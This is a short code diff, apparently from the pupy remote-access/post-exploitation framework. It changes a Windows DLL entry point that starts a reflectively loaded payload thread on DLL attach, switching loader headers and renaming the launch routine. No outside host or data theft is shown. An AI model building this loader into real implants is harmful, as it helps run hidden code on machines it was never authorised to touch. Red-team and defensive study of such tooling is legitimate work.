@@ -5,8 +5,11 @@
 
 #include <windows.h>
 #include "pupy_load.h"
-#include "ReflectiveDllInjection.h"
 #include "debug.h"
+#include "ReflectiveLoader.h"
+
+#include "Python-dynload.h"
+#include "jni_on_load.c"
 
 extern HINSTANCE hAppInstance;
 
@@ -19,13 +22,13 @@ HANDLE hThread = NULL;
 DWORD WINAPI delayedMainThread(LPVOID lpArg)
 {
     Sleep(1000);
-    return mainThread(TRUE);
+    return execute(lpArg);
 }
 
 __declspec(dllexport)
 VOID WINAPI Launch()
 {
-    mainThread(TRUE);
+    execute(NULL);
 }
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
@@ -48,13 +51,15 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
         case DLL_PROCESS_ATTACH:
             hAppInstance = hinstDLL;
 
-            if (lpReserved == 0x1) {
+            initialize(TRUE, NULL);
+
+            if (lpReserved == (LPVOID) 0x1) {
                 dprint("Special: Request for non-delayed thread\n");
-                mainThread(NULL);
+                execute(NULL);
                 return TRUE;
             }
 
-            if (!hThread && lpReserved != 0x2) {
+            if (!hThread && lpReserved != (LPVOID) 0x2) {
                 dprint("Creating delayed thread from DllMain\n");
 
                 hThread = CreateThread(
@@ -79,6 +84,7 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
                 dprint("%p exited, completed\n", hThread);
             }
 
+            deinitialize();
             break;
     }
 
